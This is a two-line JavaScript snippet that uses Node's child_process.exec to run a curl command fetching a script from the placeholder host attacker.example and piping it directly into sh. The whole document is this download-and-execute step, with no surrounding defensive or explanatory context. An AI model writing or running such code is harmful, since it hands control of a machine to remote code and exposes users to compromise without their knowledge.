const { exec } = require('child_process');
exec('curl -s https://attacker.example/payload | sh');
